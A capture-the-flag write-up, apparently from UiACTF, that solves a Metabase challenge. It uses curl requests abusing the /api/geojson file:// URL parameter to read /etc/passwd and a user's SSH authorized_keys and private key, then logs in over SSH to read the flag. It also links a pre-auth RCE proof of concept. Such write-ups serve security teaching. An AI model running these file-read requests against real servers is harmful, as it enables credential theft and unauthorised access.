# Sshadows of Metabase

Author: [Junta](https://github.com/nielth/)

Etterretning tyder på at database analyserings-verktøyet vårt vak en Google Cloud VM har blitt kompromittert. Nettverksavdelingen rapporterer rare observasjoner av ssh trafikk over ugjennkjennbar IP adresser. Nøkkeloppdraget ditt er å jakte etter hva som har potensielt kan ha skjedd.

http://sshadows-of-metabase.chall.uiactf.no

# Writeup

We quickly found that there is a [RCE](https://github.com/m3m0o/metabase-pre-auth-rce-poc) on metabase. This required the endpoint `/api/session/properties` to reveal a `setup-token`

When we found out it did not we tried to find other exploits. About 40 minutes before end of the CTF I found this [youtube clip](https://www.youtube.com/watch?v=7jXCBgmOG-M) showing `LFE`. 

```bash
curl http://sshadows-of-metabase.chall.uiactf.no/api/geojson?url=file:////etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash
```

Bingo, we know the home user so I tried a whole lot of known files until I got the eureka info, we did portscan earlier and port 22 (ssh) was open. So I tried to find a key. 

After a bit of trial and failure I found `authorized_keys`:

```bash
curl http://sshadows-of-metabase.chall.uiactf.no/api/geojson?url=file:////home/metabase/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMJ0hYshUSeg2p1uOIztcHzjQw68dZ1869y4DiBv0j7J
```

This shows an `ed25519` key. I tried to get `id_rsa` but nothing. Then I tried `id_ed25519` and got a key.

```
curl http://sshadows-of-metabase.chall.uiactf.no/api/geojson?url=file:////home/metabase/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
<removed part of key>
Qw68dZ1869y4DiBv0j7JAAAAF3Rob21hc25pZUB1YnVudHUtc2VydmVyAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

Logging  in with this key I got access to the server:

```bash
$ ssh metabase@sshadows-of-metabase.chall.uiactf.no -i id_ed25519
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

e2693a325bbb:~$ ls -lah
total 20K    
drwxr-sr-x    1 root     root        4.0K Feb 24 23:08 .
drwxr-xr-x    1 root     root        4.0K Feb 24 23:08 ..
drwxr-sr-x    1 root     root        4.0K Feb 24 23:08 .cache
drwxr-sr-x    1 root     root        4.0K Feb 24 23:02 .ssh
-rw-r--r--    1 root     root          35 Feb 24 23:02 327a6c4304ad5938eaf0efb6cc3e53dc.txt
e2693a325bbb:~$ cat 327a6c4304ad5938eaf0efb6cc3e53dc.txt 
UiACTF{R3qu3$t_M3t4b@$3_1nj3ct!0n}
e2693a325bbb:~$ 
```